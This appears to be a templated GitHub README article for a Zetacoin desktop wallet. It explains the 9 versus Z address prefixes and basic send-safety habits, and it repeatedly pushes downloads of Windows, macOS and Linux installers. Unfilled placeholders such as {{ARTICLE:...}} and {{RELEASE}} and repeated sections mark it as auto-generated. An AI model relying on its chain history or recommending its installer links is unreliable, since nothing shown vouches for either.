![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Why Zetacoin Addresses Start With 9</h1>

<p align="center">How a Zetacoin payment moves, confirms and settles, and what to do when it does not.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

Current Zetacoin addresses begin with `9`. The retired SHA-256 chain used a `Z` prefix, so an address starting with Z belongs to coins that are no longer exchangeable. The prefix is the fastest way to tell whether an address can receive ZET, and checking it prevents the most common irreversible mistake in using the wallet.

## What the prefix encodes

An address prefix is a version byte rendered in a human-readable form. Different versions produce different leading characters, which is how wallets and explorers tell networks apart before any transaction is signed.

When the chain rebuilt in 2021, the new chain used a different version, and the visible result was a change from Z to 9. Old addresses did not become invalid on the old chain; they simply describe a chain that is retired.

That is why the prefix is a reliable test. It is not a naming convention that can vary, it is part of the address format, and a wallet that produces a `9...` address is producing an address for the current chain.

| Prefix | Chain | Can receive current ZET? |
| --- | --- | --- |
| `9` | current Scrypt chain | yes |
| `Z` | retired SHA-256 chain | no |

The full walk-through, with the checks in order, is in [Send and Receive Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/send-and-receive-coins.md).

## Why this matters more than it looks

A `Z...` address is syntactically valid, which is the trap. Software does not necessarily reject it; a sender can paste it, the wallet may accept it, and the transaction is broadcast to a chain where the coins cannot be converted.

The loss is not a wallet bug and not a fee problem. It is a transfer to a different network, and the old chain's coins stopped being exchangeable when the migration window closed in August 2022.

That is why every page about sending here repeats the check. Reading one character before pressing send is the cheapest insurance available.

## What the check looks like in practice

When someone gives you an address, read the first character. If it is a nine, it is a current-chain address and can receive ZET. If it is a Z, stop and ask which wallet produced it.

For a payment you are about to make, read the first and last four characters against what the recipient sent. Clipboard substitution malware changes the middle and sometimes the ends, and a glance at both ends catches most of it.

For a payment you are about to receive, generate the address in your own wallet rather than accepting one from a third party. Receiving does not require trusting anyone else's string.

For the background behind this step, [Zetacoin Confirmations and Fees](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/confirmations-and-transaction-fees.md) covers the same ground in more detail.

## Legacy coins and what happened to them

Legacy `Z...` balances were migrated one for one through a window that closed on 1 August 2022. Unclaimed old-chain coins were burned to an address with no private key, and the old chain's coins are no longer convertible.

An old wallet file may still hold keys that correspond to a migrated balance on the current chain, which a restore and rescan can reveal. That is a check rather than a promise: if the coins were never migrated, no rescan produces them.

## Addresses, labels and reuse

The wallet generates many addresses from the same keys, so using a fresh one for each payment costs nothing and separates your activity. Labels help you remember which address was used for what.

Reuse is not dangerous in the way it is on some chains, but it does link transactions together for anyone reading the public chain. A new address per counterparty is a small habit with a real privacy benefit.

## Common questions

### Why do my addresses start with 9?

Because the current chain uses that version byte. A `Z` prefix belongs to the retired chain.

### Can I still receive to an old Z address?

No. The retired chain's coins are no longer exchangeable, so a payment there does not become current ZET.

### Is a 9 address always safe to send to?

It is the right format, which is the check you can perform. It does not tell you who controls the address, so confirm the destination with the recipient for large amounts.

### Does the wallet show both formats?

No. The client presents addresses for the current chain, which is why an address copied from an old guide is the usual source of a Z prefix.

## The short version

Nine means current, Z means retired, and the check takes one second. Read the prefix before every send, and generate your own addresses when receiving.

Related pages: {{ARTICLE:send-and-receive-zetacoin}} for the transfer steps, {{ARTICLE:zetacoin-legacy-z-address-coins}} for what a Z balance is now, {{ARTICLE:what-happened-to-zetacoin-swap}} for the migration, and {{ARTICLE:zetacoin-vs-zetachain-key-differences}} for the other naming confusion. Install from {{RELEASE}} so the client produces current-chain addresses.

## Why the format is checkable at all

An address is not an arbitrary string; it encodes a version and a checksum, which is why a mistyped address is usually rejected rather than accepted. The prefix is the visible part of that version.

That design is what makes a one-character check meaningful. Reading a nine confirms the version the address claims to belong to, and the checksum protects the rest from a typo.

What it cannot tell you is who controls the address, which is why large payments deserve a confirmation from the recipient rather than a glance at the string.

## The habit that prevents most losses

Check the prefix, then check a few characters at each end. Clipboard substitution changes the middle and sometimes the ends, and a partial read catches the difference.

For a first payment to any destination, send a small amount and confirm it arrives. That turns an irreversible mistake into a recoverable one, and it costs a fraction of the amount at stake.

{{ARTICLE:send-and-receive-zetacoin}} covers the rest of the transfer, and {{ARTICLE:zetacoin-stuck-transaction-fix}} covers what to do if a payment stalls after sending.

## What to do when the prefix is wrong

Ask which wallet produced the address. If the answer is an old installation, an old guide or a legacy client, the address is a Z address and cannot receive current coins.

Do not send a test amount to find out. That test is exactly as irreversible as the full payment, and the prefix already answered the question.

If the address came from a person who believes it is current, the useful reply is the check itself: have them generate an address in the current client and read the first character to you. That resolves it in one step without anyone sending anything.

{{ARTICLE:zetacoin-wallet-desktop-client-guide}} covers generating an address, and {{ARTICLE:send-and-receive-zetacoin}} covers the transfer that follows a correct one.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Legacy Zetacoin Z-Address Coins](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/legacy-z-address-coins.md)
- [Send and Receive Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/send-and-receive-coins.md)
- [Zetacoin Confirmations and Fees](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/confirmations-and-transaction-fees.md)
